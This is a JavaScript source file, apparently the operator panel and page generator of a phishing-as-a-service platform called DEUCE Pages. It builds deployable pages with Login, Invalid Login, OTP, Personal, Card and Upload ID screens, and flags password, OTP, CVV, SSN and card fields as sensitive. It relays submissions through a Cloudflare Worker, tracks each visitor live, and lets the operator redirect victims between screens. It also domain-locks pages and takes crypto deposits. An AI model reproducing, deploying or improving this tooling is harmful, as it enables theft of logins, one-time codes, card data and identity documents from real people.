  return session.results.map((result, index) => `
    <article class="result-card compact">
      <div class="result-head">
        <div>
          <small>Step ${index + 1}</small>
          <h3>${escapeHtml(result.screen)}</h3>
        </div>
        <span>${escapeHtml(result.date)} / ${escapeHtml(result.time)}</span>
      </div>
      <div class="result-fields">
        ${resultFieldMarkup(result.fields || {}, result.screen) || `
          <div>
            <span>Status</span>
            <strong>No form fields saved for this step</strong>
          </div>
        `}
      </div>
      ${resultActionsMarkup(result, routeKey)}
    </article>
  `).join("");
}

function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
  const routeKey = pageRouteKey(page);
  const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
  const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
  const lastDate = new Date(session.lastSeen);
  const lastSeen = Number.isNaN(lastDate.getTime()) ? "unknown" : `${lastDate.toLocaleDateString()} / ${lastDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}`;
  const activeSession = options.activeSession || null;
  const command = options.command || null;
  const pageTargets = options.pageTargets || [];
  const latestResult = session.results[session.results.length - 1] || null;
  const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
  const isBlocked = ipStatus === "Banned" || String(activeSession?.result || "").toLowerCase() === "blocked";
  const commandStatus = command?.status || (command?.targetUrl ? "queued" : "none");
  const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "offline";
  const filterTokens = Array.from(new Set([
    rowStatus,
    activeSession ? "live" : "",
    commandStatus === "queued" ? "queued" : "",
    commandStatus === "delivered" ? "delivered" : "",
    isBlocked ? "blocked" : "",
    session.results.length ? "has-results" : "idle",
    activeSession ? "" : "offline"
  ].filter(Boolean))).join(" ");
  const searchText = [
    session.sessionId,
    sessionIp,
    ipStatus,
    rowStatus,
    activeSession?.screen,
    latestResult?.screen,
    command?.note,
    command?.targetUrl
  ].filter(Boolean).join(" ").toLowerCase();
  return `
    <details class="compact-session-row result-session-card ${activeSession ? "is-live" : ""}" data-compact-session="${escapeHtml(session.sessionId)}" data-session-filter="${escapeHtml(filterTokens)}" data-session-search="${escapeHtml(searchText)}">
      <summary class="compact-session-summary">
        <span class="session-dot ${escapeHtml(rowStatus)}"></span>
        <div class="compact-session-main">
          <small>${escapeHtml(session.sessionId)}</small>
          <h3>${escapeHtml(currentFlowLabel || "Session")} <span>${session.results.length} result${session.results.length === 1 ? "" : "s"}</span></h3>
        </div>
        <div class="compact-session-meta">
          <span>IP ${escapeHtml(sessionIp)}</span>
          <span>${escapeHtml(ipStatus)}</span>
          <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
        </div>
        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel)}
      </summary>
      <div class="session-result-timeline">
        ${sessionResultDetailMarkup(session, page)}
      </div>
    </details>
  `;
}

async function loadResultsControlData(page, options = {}) {
  try {
    const [resultsData, sessionsData] = await Promise.all([
      requestApi(`/api/user-pages/${page.id}/results`),
      requestApi(`/api/user-pages/${page.id}/sessions`)
    ]);
    const results = (resultsData.results || []).map(normalizePageResult);
    syncResultNotificationState(page, results, options);
    page.results = results;
    page.activeSessions = sessionsData.sessions || [];
    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions } : item);
  } catch (error) {
    statusText.textContent = `RESULTS LOAD WARNING: ${error.message}`.toUpperCase();
  }
  return page;
}

function readFileAsDataUrl(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result || ""));
    reader.onerror = () => reject(new Error("Thumbnail read failed"));
    reader.readAsDataURL(file);
  });
}

async function uploadPackageThumbnail(input) {
  const page = getAdminPackage(input.dataset.packageThumbnail);
  const file = input.files?.[0];
  if (!page || !file) return;

  const allowedTypes = ["image/png", "image/jpeg", "image/webp", "image/svg+xml"];
  if (!allowedTypes.includes(file.type)) {
    statusText.textContent = "UPLOAD PNG, JPG, WEBP, OR SVG";
    input.value = "";
    return;
  }

  if (file.size > 500 * 1024) {
    statusText.textContent = "THUMBNAIL MUST BE UNDER 500KB";
    input.value = "";
    return;
  }

  setAppBusy(true, "Uploading thumbnail");
  try {
    const thumbnailDataUrl = await readFileAsDataUrl(file);
    const packageManifest = {
      ...(page.packageManifest || {}),
      thumbnailDataUrl,
      thumbnailFileName: file.name,
      thumbnailUpdatedAt: new Date().toISOString()
    };
    const result = await requestApi(`/api/packages/${page.id || page.slug}`, {
      method: "PATCH",
      body: JSON.stringify({ packageManifest })
    });
    const updated = normalizePackage(result.package);
    adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
    marketPages = marketPages.map((item) => item.id === updated.id ? updated : item);
    renderAdminPackageEditor(updated.slug);
    statusText.textContent = `${updated.name.toUpperCase()} THUMBNAIL UPDATED`;
  } catch (error) {
    statusText.textContent = `THUMBNAIL UPLOAD FAILED: ${error.message}`.toUpperCase();
  } finally {
    clearAppBusySoon();
  }
}

async function loadAppData() {
  apiLoadError = "";
  try {
    const auth = getAuthState();
    const packagesResult = await requestApi("/api/packages");
    let userPagesResult = { userPages: [] };
    let walletResult = { balance: 0, currency: "USD", transactions: [] };
    let depositRequestsResult = { requests: [] };
    let fundingOptionsResult = { options: walletFundingOptions };
    let adminDepositRequestsResult = { requests: [] };
    let adminUsersResult = { users: [] };
    if (auth.token) {
      userPagesResult = await requestApi("/api/user-pages");
      [walletResult, depositRequestsResult, fundingOptionsResult, adminDepositRequestsResult, adminUsersResult] = await Promise.all([
        requestApi("/api/wallet"),
        requestApi("/api/wallet/fund-requests").catch(() => ({ requests: [] })),
        requestApi("/api/wallet/funding-options").catch(() => ({ options: walletFundingOptions })),
        isAdmin()
          ? requestApi("/api/wallet/admin/fund-requests").catch(() => ({ requests: [] }))
          : Promise.resolve({ requests: [] }),
        isAdmin()
          ? requestApi("/api/admin/users").catch(() => ({ users: [] }))
          : Promise.resolve({ users: [] })
      ]);
    }
    const packages = packagesResult.packages || [];
    marketPages = packages.filter((pagePackage) => pagePackage.status === "published").map(normalizePackage);
    adminPackages = packages.map(normalizePackage);
    ownedPages = (userPagesResult.userPages || []).map(normalizeUserPage);
    walletData = walletResult || { balance: 0, currency: "USD", transactions: [] };
    walletDepositRequests = depositRequestsResult.requests || [];
    walletFundingOptions = (fundingOptionsResult.options || walletFundingOptions).map((option) => ({
      ...option,
      address: option.address || "",
      configured: Boolean(option.address || option.configured)
    }));
    adminDepositRequests = adminDepositRequestsResult.requests || [];
    adminUsers = (adminUsersResult.users || []).map(normalizeAdminUser);
  } catch (error) {
    apiLoadError = error.message;
    marketPages = [];
    adminPackages = [];
    ownedPages = [];
    adminUsers = [];
    walletData = { balance: 0, currency: "USD", transactions: [] };
    walletDepositRequests = [];
    walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
    adminDepositRequests = [];
  }
}

function emptyState(title, copy, actionHash = "") {
  return `
    <article class="empty-state">
      <h3>${title}</h3>
      <p>${copy}</p>
      ${apiLoadError ? `<small>API: ${escapeHtml(apiLoadError)}</small>` : ""}
      ${actionHash ? routeButton(actionHash, "Open setup") : ""}
    </article>
  `;
}

function getAuthState() {
  try {
    return JSON.parse(localStorage.getItem("deuceAuthState")) || { mode: "guest", user: null, token: null };
  } catch {
    return { mode: "guest", user: null, token: null };
  }
}

function saveAuthState(nextState) {
  localStorage.setItem("deuceAuthState", JSON.stringify(nextState));
  syncAdminVisibility();
}

function clearAuthState() {
  localStorage.removeItem("deuceAuthState");
  marketPages = [];
  adminPackages = [];
  adminUsers = [];
  ownedPages = [];
  walletData = { balance: 0, currency: "USD", transactions: [] };
  walletDepositRequests = [];
  adminDepositRequests = [];
  walletFundOpen = false;
  walletHistoryOpen = false;
  walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
  syncAdminVisibility();
}

function isLoggedIn() {
  return Boolean(getAuthState().token);
}

function isAdmin() {
  return String(getAuthState().user?.role || "").toLowerCase() === "admin";
}

function isAdminRoute(hash) {
  return hash === "#admin" || hash.startsWith("#admin-");
}

function syncAdminVisibility() {
  const adminNav = document.querySelector('.nav-item[href="#admin"]');
  const auth = getAuthState();
  const allowed = isAdmin();
  if (adminNav) {
    adminNav.hidden = !allowed;
    adminNav.classList.toggle("is-hidden", !allowed);
    adminNav.style.display = allowed ? "" : "none";
    adminNav.setAttribute("aria-hidden", allowed ? "false" : "true");
    adminNav.tabIndex = allowed ? 0 : -1;
  }
  const displayName = auth.user?.name || (allowed ? "Deuce Admin" : "Deuce User");
  const roleLabel = allowed ? "Admin account" : "Subscriber account";
  const profileName = document.getElementById("profileName");
  const dropdownProfileName = document.getElementById("dropdownProfileName");
  const profileRole = document.getElementById("profileRole");
  if (profileName) profileName.textContent = displayName;
  if (dropdownProfileName) dropdownProfileName.textContent = displayName;
  if (profileRole) profileRole.textContent = roleLabel;
}

function authField(name) {
  return preview.querySelector(`[data-auth-field="${name}"]`)?.value.trim() || "";
}

function setAuthLayout(enabled) {
  appShell?.classList.toggle("auth-mode", enabled);
}

async function refreshAuthUser() {
  const auth = getAuthState();
  if (!auth.token) return;
  try {
    const result = await requestApi("/api/auth/me");
    saveAuthState({ ...auth, user: result.user });
  } catch (error) {
    if (error.status === 401) clearAuthState();
  }
}

function generateRelaySecret() {
  const bytes = new Uint8Array(24);
  if (window.crypto?.getRandomValues) {
    window.crypto.getRandomValues(bytes);
    return `deuce_${Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")}`;
  }
  return `deuce_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 18)}`;
}

function cloudflareWorkerScript(page) {
  const hosting = page.hostingConfig || {};
  const backendApi = (hosting.relayTarget || apiBase()).replace(/\/$/, "");
  const relaySecret = hosting.relaySecret || "";
  return `const DEUCE_API = "${backendApi}";
const RELAY_SECRET = "${relaySecret}";

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  if (url.pathname.endsWith("/index.html")) {
    url.pathname = url.pathname.replace(/index\\.html$/, "");
    return Response.redirect(url.toString(), 301);
  }

  if (!url.pathname.startsWith("/api/")) {
    return fetch(request);
  }

  const target = new URL(DEUCE_API);
  target.pathname = "/api/runtime" + url.pathname.replace(/^\\/api/, "");
  target.search = url.search;

  const headers = new Headers(request.headers);
  headers.set("x-deuce-relay-secret", RELAY_SECRET);
  headers.set("x-deuce-client-host", url.hostname);

  return fetch(target.toString(), {
    method: request.method,
    headers,
    body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body
  });
}`;
}

function hostingTypeOptions(selectedType = "render-static-site") {
  return [
    ["render-static-site", "Static Site"],
    ["cpanel", "cPanel"],
    ["vps", "VPS"],
    ["shared-hosting", "Shared hosting"],
    ["custom-server", "Custom server"]
  ].map(([value, label]) => `<option value="${value}" ${selectedType === value ? "selected" : ""}>${label}</option>`).join("");
}

function hostingTypeLabel(value = "cpanel") {
  return {
    "render-static-site": "Static Site",
    cpanel: "cPanel",
    vps: "VPS",
    "shared-hosting": "Shared hosting",
    "custom-server": "Custom server"
  }[value] || value;
}

function setupStepClass(done, active = false) {
  if (done) return "done";
  return active ? "active" : "";
}

function goLiveChecklistMarkup(items = []) {
  return `
    <article class="security-panel go-live-checklist">
      <div class="builder-heading">
        <div>
          <small>readiness checklist</small>
          <h3>Before download</h3>
        </div>
        <strong>${items.filter((item) => item.done).length}/${items.length}</strong>
      </div>
      <div>
        ${items.map((item) => `
          <span class="${item.done ? "is-ready" : "is-waiting"}">
            <b>${item.done ? "Ready" : "Needed"}</b>
            <strong>${escapeHtml(item.label)}</strong>
            <small>${escapeHtml(item.detail)}</small>
          </span>
        `).join("")}
      </div>
    </article>
  `;
}

function packageForUserPage(page) {
  const packages = [...marketPages, ...adminPackages];
  return packages.find((pagePackage) => (
    pagePackage.id === page.packageId
    || pagePackage.slug === page.slug
    || pagePackage.slug === page.pageId
  )) || null;
}

function packageEntryFile(pagePackage) {
  const screens = pagePackage?.packageManifest?.screens || [];
  return screens.find((screen) => screen.role === "entry")?.file || screens[0]?.file || "";
}

function sessionTargetLabel(screen, fallback = "Page") {
  const value = typeof screen === "string"
    ? screen
    : screen?.name || screen?.title || screen?.label || screen?.file || fallback;
  return String(value)
    .replace(/\\/g, "/")
    .split("/")
    .pop()
    .replace(/\.html?$/i, "")
    .replace(/[-_]+/g, " ")
    .replace(/\b\w/g, (letter) => letter.toUpperCase())
    .trim() || fallback;
}

function sessionTargetFile(screen, manifestScreens = []) {
  if (typeof screen === "string") {
    const flowName = screen.trim();
    const matched = manifestScreens.find((item) => (
      String(item.name || "").toLowerCase() === flowName.toLowerCase()
      || String(item.file || "").toLowerCase() === flowName.toLowerCase()
    ));
    return matched?.file || (/\.html?$/i.test(flowName) ? flowName : "");
  }
  return String(screen?.file || screen?.path || screen?.href || "").trim();
}

function runtimeScreenTargetUrl(page, file) {
  const cleanFile = String(file || "").replace(/^\/+/, "").trim();
  if (!page?.id || !cleanFile) return "";
  const params = new URLSearchParams({ userPageId: page.id, file: cleanFile });
  return `/api/runtime/source?${params.toString()}`;
}

function canonicalRuntimeFlowTargets(page, discoveredFiles = []) {
  const byFile = new Map(discoveredFiles.map((file) => [String(file || "").toLowerCase(), file]));
  const hasFile = (file) => byFile.has(file.toLowerCase());
  const makeTarget = (label, file, options = {}) => ({
    label,
    file,
    url: runtimeScreenTargetUrl(page, file),
    ...options
  });

  const targets = [];
  [
    ["Login", "index.html"],
    ["Invalid Login", "login2.html"],
    ["OTP", "otp.html"],
    ["Email", "email.html"],
    ["Personal", "personal.html"],
    ["Card", "c.html"],
    ["Thanks", "thnks.html"]
  ].forEach(([label, file]) => {
    if (hasFile(file)) targets.push(makeTarget(label, byFile.get(file.toLowerCase())));
  });

  if (hasFile("otp2.html")) {
    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp2.html")));
  } else if (hasFile("otp.html")) {
    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp.html"), {
      forceReload: true,
      fallbackFor: "otp2.html"
    }));
  }

  const uploadFile = discoveredFiles.find((file) => /(^|\/)(upload|upload-?id|photo|photo-?id|id-?photo|id|id-upload|id_upload|document|docs?)\.html?$/i.test(file));
  if (uploadFile && !targets.some((target) => target.file.toLowerCase() === uploadFile.toLowerCase())) {
    const insertBeforeThanks = targets.findIndex((target) => target.file.toLowerCase() === "thnks.html");
    const uploadTarget = makeTarget("Upload ID", uploadFile);
    if (insertBeforeThanks === -1) targets.push(uploadTarget);
    else targets.splice(insertBeforeThanks, 0, uploadTarget);
  }

  return targets.filter((target) => target.url);
}

function sessionPageTargets(page) {
  const pagePackage = packageForUserPage(page);
  const manifestScreens = pagePackage?.packageManifest?.screens || [];
  const candidates = [
    ...(page.flow || []),
    ...manifestScreens,
    ...(pagePackage?.screens || [])
  ];
  const seen = new Set();
  const discoveredFiles = candidates.reduce((files, screen) => {
    const file = sessionTargetFile(screen, manifestScreens).replace(/^\/+/, "");
    if (!file || !/\.html?$/i.test(file) || seen.has(file.toLowerCase())) return files;
    seen.add(file.toLowerCase());
    files.push(file);
    return files;
  }, []);

  return canonicalRuntimeFlowTargets(page, discoveredFiles);
}

function shouldUsePackageRuntime(page, pagePackage) {
  return Boolean(
    pagePackage?.sourceType === "github"
    && pagePackage?.packageManifest?.github
    && packageEntryFile(pagePackage)
    && (page.hostingConfig?.connectionType || "cloudflare-worker") === "cloudflare-worker"
  );
}

function createPackageRuntimeIndex(page, pagePackage) {
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
  const entryFile = packageEntryFile(pagePackage);
  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    source: {
      type: pagePackage.sourceType,
      entryFile,
      screens: pagePackage.packageManifest?.screens || []
    },
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: hostingConfig,
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: {
      ...(page.securityConfig || {}),
      turnstile: {
        enabled: Boolean(page.securityConfig?.captcha),
        provider: "turnstile",
        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || ""
      }
    },
    generatedFile: page.generatedFile,
    runtime: {
      mode: "launcher",
      entryFile,
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      sourceEndpoint: `${runtimeApiBase}/source?userPageId=${encodeURIComponent(page.id)}`
    }
  };
  delete payload.security.turnstileSecretKey;
  delete payload.security.secretKey;
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<!-- DEUCE runtime launcher: upload this one index.html. The full page package is served by DEUCE runtime for this subscriber. -->
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      * { box-sizing: border-box; }
      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
      #deuceBlock {
        min-height: 100vh;
        display: none;
        place-items: center;
        padding: 24px;
        color: #eef8f2;
        background: #050607;
      }
      #deuceBlock.active { display: grid; }
      #deuceBlock article {
        max-width: 520px;
        border: 1px solid rgba(124,255,178,.24);
        border-radius: 10px;
        padding: 28px;
        background: #0d1112;
      }
      #deuceBlock small { color: #7cffb2; font-weight: 800; text-transform: uppercase; }
      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
      #deuceBlock p { color: #8da199; line-height: 1.55; }
    </style>
  </head>
  <body>
    <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
    <section id="deuceBlock">
      <article>
        <small>access denied</small>
        <h1 id="deuceBlockTitle">ACCESS DENIED</h1>
        <p id="deuceBlockCopy">ACCESS DENIED</p>
      </article>
    </section>
    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};
      const config = window.DEUCE_PAGE_CONFIG;
      const allowed = config.allowedDomains || [];
      const host = window.location.hostname;
      const frame = document.getElementById("deuceFrame");
      const block = document.getElementById("deuceBlock");
      const blockCopy = document.getElementById("deuceBlockCopy");

      function normalizeHost(value) {
        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
      }

      function blockPage(message) {
        frame.remove();
        block.classList.add("active");
        blockCopy.textContent = message;
      }

      const allowedHosts = allowed.map(normalizeHost).filter(Boolean);

      if (allowedHosts.length && !allowedHosts.includes(normalizeHost(host))) {
        blockPage("ACCESS DENIED");
      } else {
        frame.src = config.runtime.sourceEndpoint;
      }
    <\/script>
  </body>
</html>`;
}

function createGeneratedIndex(page) {
  const pagePackage = packageForUserPage(page);
  if (shouldUsePackageRuntime(page, pagePackage)) {
    return createPackageRuntimeIndex(page, pagePackage);
  }

  const screens = page.flow.map((screenName) => {
    const screen = screenLibrary.find((item) => item.name === screenName);
    return {
      name: screenName,
      type: screen?.type || "Custom screen",
      config: getScreenConfig(page, screenName)
    };
  });
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const securityConfig = page.securityConfig || {};
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
  const publicSecurity = {
    ...securityConfig,
    turnstile: {
      enabled: Boolean(securityConfig.captcha),
      provider: "turnstile",
      siteKey: securityConfig.turnstile?.siteKey || securityConfig.turnstileSiteKey || ""
    }
  };
  delete publicSecurity.turnstileSecretKey;
  delete publicSecurity.secretKey;

  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    licenseKey: page.generatedFile?.licenseKey || `${page.id}_${page.packageVersion}`.replace(/[^a-z0-9_]/gi, "_"),
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: hostingConfig,
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: publicSecurity,
    generatedFile: page.generatedFile,
    runtime: {
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      resultEndpoint: `${runtimeApiBase}/results`,
      trafficEndpoint: `${runtimeApiBase}/traffic`,
      securityEndpoint: `${runtimeApiBase}/security/check`,
      commandEndpoint: `${runtimeApiBase}/session-command`,
      turnstileEndpoint: `${runtimeApiBase}/verify-human`
    },
    screens
  };
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      :root {
        color-scheme: dark;
        --bg: #050607;
        --panel: #0d1112;
        --text: #eef8f2;
        --muted: #8da199;
        --accent: #7cffb2;
        --line: rgba(124,255,178,.22);
        --danger: #ff4d8d;
        font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      }
      * { box-sizing: border-box; }
      body {
        min-height: 100vh;
        margin: 0;
        display: grid;
        place-items: center;
        padding: 24px;
        color: var(--text);
        background:
          linear-gradient(115deg, rgba(2,3,3,.98), rgba(7,10,11,.9)),
          repeating-linear-gradient(90deg, rgba(124,255,178,.08) 0 1px, transparent 1px 72px),
          var(--bg);
      }
      main {
        width: min(560px, 100%);
        border: 1px solid var(--line);
        border-radius: 10px;
        padding: clamp(22px, 6vw, 38px);
        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.025)), var(--panel);
        box-shadow: 0 28px 90px rgba(0,0,0,.42);
      }
      small {
        color: var(--accent);
        font: 800 .72rem Consolas, monospace;
        text-transform: uppercase;
      }
      h1 { margin: 10px 0 10px; font-size: clamp(1.8rem, 8vw, 3rem); line-height: 1; }
      p { color: var(--muted); line-height: 1.65; }
      form { display: grid; gap: 12px; margin-top: 22px; }
      label { display: grid; gap: 6px; color: var(--muted); font-size: .82rem; }
      input, textarea, select {
        width: 100%;
        min-height: 44px;
        border: 1px solid rgba(255,255,255,.12);
        border-radius: 8px;
        padding: 0 12px;
        color: var(--text);
        background: rgba(255,255,255,.05);
      }
      textarea { min-height: 92px; padding: 12px; resize: vertical; }
      button {
        min-height: 46px;
        border: 1px solid var(--accent);
        border-radius: 8px;
        color: #02120a;
        background: var(--accent);
        font-weight: 900;
        cursor: pointer;
      }
      .meta {
        display: flex;
        justify-content: space-between;
        gap: 12px;
        margin-top: 18px;
        color: var(--muted);
        font: 800 .72rem Consolas, monospace;
      }
      .status {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 18px;
      }
      .status span, .captcha-box {
        border: 1px solid rgba(255,255,255,.1);
        border-radius: 8px;
        padding: 8px 10px;
        color: var(--muted);
        background: rgba(255,255,255,.04);
        font: 800 .72rem Consolas, monospace;
      }
      .captcha-box { display: none; min-height: 74px; align-items: center; justify-content: center; }
      .captcha-box.active { display: flex; }
      .blocked {
        border-color: rgba(255,77,141,.48);
      }
      .blocked h1 { color: #ff8aae; }
      .hidden { display: none; }
    </style>
    ${publicSecurity.captcha && publicSecurity.turnstile.siteKey ? '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' : ""}
  </head>
  <body>
    <main>
      <small id="stepLabel"></small>
      <h1 id="screenTitle"></h1>
      <p id="screenCopy"></p>
      <div class="status" id="runtimeStatus"></div>
      <form id="screenForm"></form>
      <div class="meta">
        <span id="pageName"></span>
        <span id="progress"></span>
      </div>
    </main>

    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};

      const config = window.DEUCE_PAGE_CONFIG;
      let currentStep = 0;
      const sessionData = {};
      const sessionId = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      let runtimeAllowed = true;
      let captchaPassed = !config.security?.captcha;
      let captchaToken = "";
      let captchaWidgetId = null;
      const pageName = document.querySelector("#pageName");
      const progress = document.querySelector("#progress");
      const stepLabel = document.querySelector("#stepLabel");
      const screenTitle = document.querySelector("#screenTitle");
      const screenCopy = document.querySelector("#screenCopy");
      const screenForm = document.querySelector("#screenForm");
      const runtimeStatus = document.querySelector("#runtimeStatus");

      pageName.textContent = config.pageName;

      function endpoint(path) {
        if (path.startsWith("http")) return path;
        return config.apiBase.replace(/\\/$/, "") + "/" + path.replace(/^\\//, "");
      }

      function setStatus(items) {
        runtimeStatus.innerHTML = items.map((item) => "<span>" + item + "<\\/span>").join("");
      }

      function blockPage(reason, detail) {
        runtimeAllowed = false;
        document.querySelector("main").classList.add("blocked");
        stepLabel.textContent = "access denied";
        screenTitle.textContent = "ACCESS DENIED";
        screenCopy.textContent = "ACCESS DENIED";
        screenForm.innerHTML = "";
        progress.textContent = "blocked";
      }

      function normalizeHost(value) {
        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
      }

      function enforceDomain() {
        const allowedDomains = (config.allowedDomains || config.security?.domains || []).map(normalizeHost).filter(Boolean);
        const hostname = normalizeHost(window.location.hostname);

        if (allowedDomains.length && !allowedDomains.includes(hostname)) {
          blockPage("ACCESS DENIED", "ACCESS DENIED");
          return false;
        }
        return true;
      }

      async function checkRemoteSecurity(eventName) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          hostname: window.location.hostname,
          sessionId,
          event: eventName,
          createdAt: new Date().toISOString()
        };

        try {
          const response = await fetch(config.runtime.securityEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
          if (!response.ok) return true;
          const decision = await response.json();
          if (decision.allowed === false) {
            blockPage("ACCESS DENIED", "ACCESS DENIED");
            return false;
          }
          return true;
        } catch (error) {
          console.info("DEUCE Pages security check queued for Render API", payload);
          return true;
        }
      }

      function trackTraffic(eventName, extra = {}) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          sessionId,
          hostname: window.location.hostname,
          path: window.location.pathname,
          event: eventName,
          screen: config.screens[currentStep]?.name || null,
          userAgent: navigator.userAgent,
          createdAt: new Date().toISOString(),
          ...extra
        };

        fetch(config.runtime.trafficEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages traffic payload queued for Render API", payload);
        });
      }

      function trackHeartbeat() {
        trackTraffic("heartbeat", {
          metadata: {
            visibility: document.visibilityState || "visible"
          }
        });
      }

      function sameLocation(targetUrl) {
        try {
          const target = new URL(targetUrl, window.location.href);
          const current = new URL(window.location.href);
          return target.origin === current.origin
            && target.pathname === current.pathname
            && target.search === current.search
            && target.hash === current.hash;
        } catch (error) {
          return false;
        }
      }

      function checkSessionCommand() {
        const commandUrl = config.runtime.commandEndpoint || endpoint("/api/runtime/session-command");
        const params = new URLSearchParams({ userPageId: config.id, sessionId });
        fetch(\`\${commandUrl}?\${params.toString()}\`)
          .then((response) => response.ok ? response.json() : null)
          .then((data) => {
            const command = data && data.command;
            if (command && command.action === "redirect" && command.targetUrl) {
              if (sameLocation(command.targetUrl)) {
                if (command.forceReload) window.location.reload();
                return;
              }
              window.location.href = command.targetUrl;
            }
          })
          .catch(() => {});
      }

      window.setInterval(checkSessionCommand, 4000);
      window.setInterval(trackHeartbeat, 10000);

      function fieldsFor(screen) {
        return String(screen.config.fields || "")
          .split(",")
          .map((field) => field.trim())
          .filter(Boolean);
      }

      function inputTypeFor(field) {
        const lower = field.toLowerCase();
        if (lower.includes("email")) return "email";
        if (lower.includes("phone") || lower.includes("otp") || lower.includes("code")) return "tel";
        if (lower.includes("password") || lower.includes("pin")) return "password";
        return "text";
      }

      function isSensitiveField(field, input) {
        const text = [
          field,
          input && input.name,
          input && input.id,
          input && input.type,
          input && input.autocomplete,
          input && input.placeholder
        ].filter(Boolean).join(" ").toLowerCase();
        return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
      }

      function fieldLabel(input) {
        const escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
        const label = escapedId ? document.querySelector('label[for="' + escapedId + '"]') : null;
        const wrapperLabel = input.closest && input.closest("label");
